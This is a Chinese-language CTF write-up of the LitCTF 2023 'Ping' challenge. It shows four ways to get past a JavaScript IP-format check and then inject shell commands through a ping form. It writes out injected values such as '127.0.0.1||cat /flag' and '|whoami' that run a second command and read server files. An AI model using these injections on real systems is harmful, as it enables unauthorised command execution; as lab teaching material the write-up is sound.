---
title: "Web 5 [LitCTF 2023]Ping"
published: 2024-11-30
category: CTF
---

一题多解思路。

![](https://pic.npiter.de/file/1771514793071_20260219232557891.png)

![](https://pic.npiter.de/file/1771514773040_20260219232557888.png)

## 前置分析

随便 ping 一个值（比如本地回环 `127.0.0.1`）：

![](https://pic.npiter.de/file/1771514768555_20260219232557887.png)

提交被拦截，有前端验证。查看源码发现是 JavaScript 的 IP 格式校验：

![](https://pic.npiter.de/file/1771514784197_20260219232557890.png)

`check_ip()` 函数用正则表达式验证 IPv4 格式，不符合就弹窗阻止提交。

## 思路一：禁用 JavaScript

直接在浏览器设置里禁用 JavaScript，绕过前端验证。

![](https://pic.npiter.de/file/1771514802659_20260219232557893.png)

![](https://pic.npiter.de/file/1771514760189_20260219232557886.png)

禁用后输入 `127.0.0.1` 可以正常提交，但结果好像没什么用。接着尝试命令注入：

输入 `127.0.0.1||ls/`：

![](https://pic.npiter.de/file/1771514808944_20260219232557894.png)

找到了 flag 文件。输入 `127.0.0.1||cat /flag`：

![](https://pic.npiter.de/file/1771514808598_20260219232557895.png)

**flag = `NSSCTF{cae6837d-0912-4b2b-bbd8-0ed6e1695c9e}`**

## 思路二：HackBar 发包

通过 HackBar 直接发送 POST 请求，绕过前端验证。

参数值同样用 `127.0.0.1||ls/` 列目录，再用 `127.0.0.1||cat /flag` 读取内容。

![](https://pic.npiter.de/file/1771514821787_20260219232557896.png)

## 思路三：Hook 绕过前端验证

在浏览器开发者工具控制台中执行：

```javascript
check_ip = function(){}
```

将 `check_ip` 替换为空函数，此后任何输入都会通过验证，直接提交即可。

![](https://pic.npiter.de/file/1771514819513_20260219232557897.png)

## 思路四：BurpSuite 抓包改参数

用 BurpSuite 拦截请求后修改参数值：

1. 原始请求中 `command=127.0.0.1`
2. 改为 `command=127.0.0.1|whoami` 确认执行权限，返回 `www-data`
3. 改为 `command=127.0.0.x||find / -name flag*` 查找 flag 文件，返回 `/flag`
4. 改为 `command=127.0.0.x||cat /flag` 读取内容

## 总结

- 考点：前端验证绕过 + 命令注入（RCE）
- 经典 Ping 命令 RCE 题，前端用 JS 阻止危险输入，后端直接拼接命令执行
- 多种绕过手段：禁用 JS、HackBar、Hook 函数、BurpSuite 拦截
